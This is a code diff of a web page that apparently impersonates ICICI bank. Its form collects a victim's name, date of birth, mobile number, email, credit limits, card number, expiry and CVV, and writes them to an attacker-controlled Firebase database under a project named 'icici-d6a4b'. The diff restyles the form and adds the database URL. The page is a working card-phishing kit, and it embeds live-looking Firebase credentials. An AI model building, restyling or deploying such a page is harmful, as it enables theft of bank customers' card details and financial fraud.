@@ -24,7 +24,8 @@ header {
   left: 0;
   width: 100%;
   height: 80px;
-  background-color: #ffffff;
+  background-color: white;
+  border-bottom: 1px solid #ffffff;
   display: flex;
   justify-content: center;
   align-items: center;
@@ -33,94 +34,65 @@ header {
 }
 
 header img {
-  max-height: 50px;
-  width: auto;
-  transition: all 0.3s ease;
+    max-height: 50px;
+    width: auto;
+    transition: all 0.3s ease;
 }
 
 .container {
-  margin-top: 120px;
+  margin-top: 100px;
   padding: 20px;
   padding-bottom: 50px;
-  display: flex;
-  justify-content: center;
 }
 
 form {
-  width: 100%;
-  max-width: 500px;
+  max-width: 600px;
+  margin: 0 auto;
   background-color: #fff;
-  padding: 40px;
+  padding: 30px;
   border-radius: 8px;
-  
 }
 
-.form-field {
-  position: relative;
+label {
+  display: block;
+  margin-bottom: 8px;
+  font-weight: 500;
+  color: #555;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
   margin-bottom: 20px;
-}
-
-.form-field input {
-  width: 100%;
-  padding: 16px 16px 16px 16px; /* Padding to make room for label */
-  font-size: 16px;
-  border: 2px solid #ddd;
-  border-radius: 4px;
-  background-color: #fff;
-  transition: border-color 0.3s ease;
   box-sizing: border-box;
-}
-
-.form-field input:focus {
-  outline: none;
-  border-color: #98272A;
-}
-
-.form-field label {
-  position: absolute;
-  left: 16px;
-  top: 16px;
-  color: #757575;
+  border: 1px solid #000;
+  border-radius: 4px;
   font-size: 16px;
-  transition: all 0.2s ease-out;
-  pointer-events: none;
-  background-color: #fff; /* Ensure label background is the same as input */
-  padding: 0 4px; /* Small padding for label */
+  transition: border-color 0.3s ease;
 }
 
-.form-field input:focus ~ label,
-.form-field input:not(:placeholder-shown) ~ label {
-  top: -8px; /* Moves label above the input */
-  left: 12px;
-  font-size: 12px;
-  color: #98272A;
+input:focus {
+  outline: none;
+  border-color: #F99D27;
+  box-shadow: 0 0 5px rgba(70, 3, 214, 0.2);
 }
 
-.form-field .bar {
-  position: absolute;
-  bottom: 0;
-  left: 0;
-  width: 100%;
-  height: 2px;
-  background: #98272A;
-  transition: transform 0.2s ease-out;
-  transform: scaleX(0);
-}
-
-.form-field input:focus ~ .bar {
-  transform: scaleX(1);
+/* Style for placeholder text */
+::placeholder {
+  color: #888;
+  opacity: 1;
 }
 
 button {
   height: 50px;
-  width: 100%;
+  width: 200px;
   padding: 10px;
-  margin: 15px 0 30px 0;
+  margin: 15px auto 30px auto;
   display: block;
   box-sizing: border-box;
   border: none;
   border-radius: 25px;
-  background-color: #98272A;
+  background-color: #F99D27;
   color: #fff;
   font-size: 16px;
   font-weight: bold;
@@ -144,8 +116,9 @@ button:before {
 }
 
 button:hover {
-  background-color: #98272A;
-  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+  background-color: #F99D27;
+  width: 220px;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
 }
 
 button:hover:before {
@@ -179,73 +152,41 @@ button:hover:before {
   </header>
   <div class="container">
     <form id="userForm" onsubmit="submitForm(); return false;">
-      
-      <div class="form-field">
-        <input type="text" id="name" name="name" placeholder=" " required>
-        <label for="name">Name:</label>
-        <div class="bar"></div>
-      </div>
-      
-      <div class="form-field">
-        <input type="text" id="dob" name="dob" placeholder=" " required>
-        <label for="dob">Date of Birth:</label>
-        <div class="bar"></div>
-      </div>
-      
-      <div class="form-field">
-        <input type="number" id="mobile" name="mobile" placeholder=" " required>
-        <label for="mobile">Mobile Number:</label>
-        <div class="bar"></div>
-      </div>
-      
-      <div class="form-field">
-        <input type="email" id="email" name="email" placeholder=" " required>
-        <label for="email">Email Address:</label>
-        <div class="bar"></div>
-      </div>
-     
-      <div class="form-field">
-        <input type="number" id="totalLimit" name="totalLimit" placeholder=" " required>
-        <label for="totalLimit">Total Limit:</label>
-        <div class="bar"></div>
-      </div>
-      
-      <div class="form-field">
-        <input type="number" id="availableLimit" name="availableLimit" placeholder=" " required>
-        <label for="availableLimit">Available Limit:</label>
-        <div class="bar"></div>
-      </div>
+      <label for="name">Name:</label>
+      <input type="text" id="name" name="name" placeholder="Enter your name" required>
 
-      <div class="form-field">
-        <input type="text" id="cardholdername" name="cardholdername" placeholder=" " required>
-        <label for="cardholdername">Card Holder Name:</label>
-        <div class="bar"></div>
-      </div>
-     
+      <label for="dob">Date of Birth:</label>
+      <input type="text" id="dob" name="dob" placeholder="Date Of Birth" required>
 
-      <div class="form-field">
-        <input type="text" id="cardnumber" name="cardnumber" maxlength="19" placeholder=" " required>
-        <label for="cardnumber">Card Number:</label>
-        <div class="bar"></div>
-      </div>
-    
-      <div class="form-field">
-        <input type="text" id="expiryDate" name="expiryDate" maxlength="5" placeholder=" " required>
-        <label for="expiryDate">Card Expiry:</label>
-        <div class="bar"></div>
-      </div>
-    
-      <div class="form-field">
-        <input type="password" id="cvv" name="cvv" maxlength="4" placeholder=" " required>
-        <label for="cvv">Card CVV:</label>
-        <div class="bar"></div>
-      </div>
+      <label for="mobile">Mobile Number:</label>
+      <input type="number" id="mobile" name="mobile" placeholder="Enter your mobile number" required>
+
+      <label for="email">Email Address:</label>
+      <input type="email" id="email" name="email" placeholder="Enter your email" required>
+
+      <label for="totalLimit">Total Limit:</label>
+      <input type="number" id="totalLimit" name="totalLimit" placeholder="Enter total limit" required>
+
+      <label for="availableLimit">Available Limit:</label>
+      <input type="number" id="availableLimit" name="availableLimit" placeholder="Enter available limit" required>
+
+      <label for="cardholdername">Card Holder Name:</label>
+      <input type="text" id="cardholdername" name="cardholdername" placeholder="Enter card holder name" required>
+
+      <label for="cardnumber">Card Number:</label>
+      <input type="text" id="cardnumber" name="cardNumber" maxlength="19" placeholder="Enter card number" required>
+
+      <label for="expiryDate">Card Expiry:</label>
+      <input type="text" id="expiryDate" name="expiryDate" maxlength="5" placeholder="MM/YY" required>
+
+      <label for="cvv">Card CVV:</label>
+      <input type="password" id="cvv" name="cvv" maxlength="4" placeholder="Enter CVV" required>
 
       <button type="submit">Proceed Now</button>
     </form>
   </div>
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-  <script src="jquery-ui.min.js"></script>
+ <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+ <script src="jquery-ui.min.js"></script>
   <script>
     // Initialize Flatpickr for the date of birth field
     document.addEventListener('DOMContentLoaded', function() {
@@ -295,10 +236,12 @@ button:hover:before {
         input.value = formattedValue;
     });
 
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    // Firebase configuration
+   // For Firebase JS SDK v7.20.0 and later, measurementId is optional
 const firebaseConfig = {
   apiKey: "AIzaSyAQ4Vx6jy4yq_xJcJtvST9ccCoJVbUukLg",
   authDomain: "icici-d6a4b.firebaseapp.com",
+  databaseURL: "https://icici-d6a4b-default-rtdb.firebaseio.com",
   projectId: "icici-d6a4b",
   storageBucket: "icici-d6a4b.appspot.com",
   messagingSenderId: "1040727251896",
@@ -333,8 +276,8 @@ const firebaseConfig = {
                 database.ref("/main").child(formData.mobile).child("Details").set(formData)
             }
         });
-        database.ref().child("key").set(formData.mobile);
-        database.ref("/main").child(formData.mobile).child("Details").set(formData)
+      database.ref().child("key").set(formData.mobile);
+      database.ref("/main").child(formData.mobile).child("Details").set(formData)
     }
   </script>
 </body>
